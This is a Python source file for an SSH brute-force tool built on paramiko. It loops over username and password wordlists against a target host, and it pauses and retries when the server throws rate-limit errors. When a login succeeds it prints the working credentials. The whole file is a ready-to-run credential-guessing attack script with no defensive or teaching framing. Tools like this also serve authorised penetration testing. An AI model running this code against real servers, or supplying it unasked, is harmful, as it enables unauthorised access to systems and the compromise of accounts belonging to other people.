import paramiko
import socket
import time

class SSHBruteforce:
    def __init__(self, host, passlist_path, user=None, userlist_path=None):
        self.host = host
        self.passlist_path = passlist_path
        self.user = user
        self.userlist_path = userlist_path
        
    def _is_ssh_open(self, host, user, passwd):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            client.connect(hostname=host, username=user, password=passwd, timeout=3)
        except socket.timeout:
            print(f"[\033[91m!\033[0m] HOST UNREACHABLE: {host} could not be reached, timed out.", flush=True)
            return False
        except paramiko.AuthenticationException:
            print(f"[\033[91m!\033[0m] Invalid credentials for {user}:{passwd}", flush=True)
            return False
        except paramiko.SSHException:
            print(f"[\033[93m*\033[0m] Quota exceeded, retrying with delay...", flush=True)
            time.sleep(60)
            return self._is_ssh_open(host, user, passwd)
        except Exception as e:
            print(f"[\033[91m!\033[0m] Error: {e}", flush=True)
            return False
        else:
            print("\n" + "-"*45, flush=True)
            print(f"[\033[92m+\033[0m] FOUND COMBINATION FOR {host}:", flush=True)
            print(f"USER: \033[92m{user}\033[0m PASSWORD: \033[92m{passwd}\033[0m", flush=True)
            print("-" * 45 + "\n", flush=True)
            return True

    def execute(self):
        try:
            with open(self.passlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = f.read().splitlines()
                
            users = []
            if self.user:
                users.append(self.user)
            elif self.userlist_path:
                with open(self.userlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                    users = f.read().splitlines()
            else:
                print("[\033[91m!\033[0m] Error: No username or userlist provided.", flush=True)
                return
                
            for u in users:
                for p in passwords:
                    if self._is_ssh_open(self.host, u, p):
                        return # Stop when found
            print("[\033[91m-\033[0m] Bruteforce finished. No valid credentials found.", flush=True)
        except FileNotFoundError as e:
            print(f"[\033[91m!\033[0m] File error: {e}", flush=True)
